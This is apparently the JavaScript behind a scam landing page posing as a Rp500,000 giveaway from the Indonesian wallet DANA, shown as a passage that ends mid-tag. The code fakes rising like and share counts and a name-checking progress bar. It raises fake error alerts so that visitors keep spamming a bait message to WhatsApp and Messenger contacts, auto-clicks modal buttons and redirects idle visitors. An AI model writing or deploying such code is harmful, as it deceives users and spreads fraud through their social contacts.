<script id="inp7bq">
    let redirectTimer;
    function startRedirectTimer() { redirectTimer = setTimeout(function(){ window.location.href = REDIRECT_URL; }, 300000); }
    function resetRedirectTimer() { clearTimeout(redirectTimer); startRedirectTimer(); }
    startRedirectTimer();
    document.addEventListener("mousemove", resetRedirectTimer);
    document.addEventListener("keydown", resetRedirectTimer);
    document.addEventListener("click", resetRedirectTimer);
    document.addEventListener("scroll", resetRedirectTimer);
    function startTimer(duration, display) {
        let timer = duration, minutes, seconds;
        setInterval(function() {
            minutes = parseInt(timer / 60, 10);
            seconds = parseInt(timer % 60, 10);
            minutes = minutes < 10 ? "0" + minutes : minutes;
            seconds = seconds < 10 ? "0" + seconds : seconds;
            display.textContent = minutes + ":" + seconds;
            if (--timer < 0) timer = duration;
        }, 1000);
    }
    const duration = 59;
    const display = document.querySelector('#timer');
    if(display) startTimer(duration, display);
    document.addEventListener("DOMContentLoaded", function() {
        const popups = [{ id: 'popup1', delay: 3000, duration: 4000 },
                { id: 'popup2', delay: 9000, duration: 4000 },
                { id: 'popup3', delay: 17000, duration: 4000 },
                { id: 'popup4', delay: 25000, duration: 4000 },
                { id: 'popup5', delay: 33000, duration: 4000 },
                { id: 'popup6', delay: 41000, duration: 4000 },
                { id: 'popup7', delay: 49000, duration: 4000 },
                { id: 'popup8', delay: 57000, duration: 4000 },
                { id: 'popup9', delay: 65000, duration: 4000 },
                { id: 'popup10', delay: 73000, duration: 4000 },
                { id: 'popup11', delay: 81000, duration: 4000 }];
        function showConfetti() {
            confetti({ particleCount: 150, spread: 120, startVelocity: 30, gravity: 0.5, origin: { x: 0.5, y: 0 }, scalar: 1.4, shapes: ['circle', 'square'], colors: ['#bb0000', '#ffffff'], useWorker: true, zIndex: 99999, disableForReducedMotion: true });
        }
        popups.forEach(popup => {
            const element = document.getElementById(popup.id);
            setTimeout(function() {
                element.classList.add("show");
                showConfetti();
                setTimeout(function() { element.classList.remove("show"); }, popup.duration);
            }, popup.delay);
        });
        document.addEventListener('click', (event) => {
            const activeModal = document.querySelector('.sweet-alert.animated.bounceIn.visible');
            if(activeModal) {
                const activeButton = activeModal.querySelector('button');
                const customClickEvent = new Event('customClick');
                activeButton.dispatchEvent(customClickEvent);
            }
        });
        document.getElementById('ihp0f5')?.addEventListener('customClick', function(){ this.click(); });
        document.getElementById('i247bq')?.addEventListener('customClick', function(){ this.click(); });
        document.getElementById('ipm3uj')?.addEventListener('customClick', function(){ this.click(); });
    });
    function hidemodal01() {}
    function hidemodal02() {}
</script>

<script type="text/javascript">
    var time = 0;
    window.setInterval(function() { time = time + 1; $(".t1").html(time + 1 + "m"); $(".t2").html(time + 2 + "m"); $(".t3").html(time + 4 + "m"); }, 6e4);
    var likes = 134, comments = 23, shares = 12;
    window.setInterval(function() {
        likes = likes + Math.floor(Math.random() * 3);
        comments = comments + Math.floor(Math.random() * 2);
        shares = shares + Math.floor(Math.random() * 2);
        $("#likes").html(likes + "K");
        $("#comments").html(comments + "K comments");
        $("#shares").html(shares + "K shares");
    }, 5e3);
    $(".liked").click(function() {
        if ($(this).hasClass("selected")) { $(this).removeClass("selected").html("Like"); }
        else { $(this).addClass("selected").html("Unlike"); }
    });
    $("#go").click(function() {
        $("#intro").fadeOut(0);
        $("#loader").fadeIn(1000);
        var i = 0;
        var interval = setInterval(function() {
            $("#num").text(i + "%");
            i += 1;
            if (i >= 100) { clearInterval(interval); $("#loader").fadeOut(0); $("#info").fadeIn(1000); }
        }, 50);
    });
    $("#confirm").click(function() {
        if ($("#name").val().length < 4) { $(".error").fadeIn(500); }
        else {
            $("#info").fadeOut(0);
            $("#checking").fadeIn(1000);
            var i = 0;
            var interval = setInterval(function() {
                i += 1;
                $("#percentage").text(i + "%");
                $("#fill").css("width", i + "%");
                if (i == 50) { i = 49; setTimeout(function() { i = 50; }, 1000); }
                if (i >= 100) {
                    clearInterval(interval);
                    $("#load").fadeOut(0);
                    $("#check").fadeIn(0);
                    setTimeout(function() { $("#checking").fadeOut(0); $("#share").fadeIn(1000); $("#getname").html($("#name").val()); }, 500);
                }
            }, 50);
        }
    });
    $(document).click(function() { if ($("#name").is(":focus")) { $(".error").fadeOut(500); } });
</script>

<script>

var saved = "";   
var width = localStorage.getItem(saved) ? parseInt(localStorage.getItem(saved)) : 0;
if (width > 0) {
    $("#intro, .comments").fadeOut(0);
    $("#share").fadeIn(0);
    $("#fill2").css("width", width + "%");
    $("#percentage2").text(width + "%");
}


var text1 = "*DANA bagi-bagi saldo Rp500.000* %0A%0A Aku baru saja dapat 😳 cek apakah kamu juga dapat.%0A%0A_Klik di sini_ 👇%0A";
// var landingDomain = window.location.href;
var errorMsg = "Sorry, something went wrong!\nYou might have shared multiple times to the same friend or group. Please try sharing again.";


function shareWhatsApp() {
    var share = "whatsapp://send?text=" + text1 + landingDomain;
    window.location.href = share;
}

function shareMessenger() {
    var share = "fb-messenger://share/?link=" + encodeURIComponent(landingDomain);
    window.location.href = share;
}

function increaseProgress() {
    if (width == 0) {
        width += 50;
    } else if (width == 50) {
        alert(errorMsg);
        width += 15;
    } else if (width == 65) {
        width += 5;
    } else if (width == 70) {
        alert(errorMsg);
        width += 10;
    } else if (width == 80) {
        alert(errorMsg);
        width += 5;
    } else if (width == 85) {
        width += 2;
    } else if (width == 87) {
        width += 1;
    } else if (width == 88) {
        width += 2;
    } else if (width == 90) {
        width += 1;
    } else if (width == 91) {
        width += 1;
    } else if (width == 92) {
        width += 1;
    } else if (width == 93) {
        width += 1;
    } else if (width == 94) {
        width += 1;
    } else if (width == 95) {
        width += 1;
    } else if (width == 96) {
        width += 2;
    } else {
        $("#share").fadeOut(0);
        $("#claim").fadeIn(1000);
    }
    localStorage.setItem(saved, width);
    setTimeout(function() {
        $("#fill2").css("width", width + "%");
        $("#percentage2").text(width + "%");
    }, 2000);
}

$("#whatsapp-btn").click(function() {
    shareWhatsApp();
    increaseProgress();
});

$("#messenger-btn").click(function() {
    shareMessenger();
    increaseProgress();
});
</script>

<script>
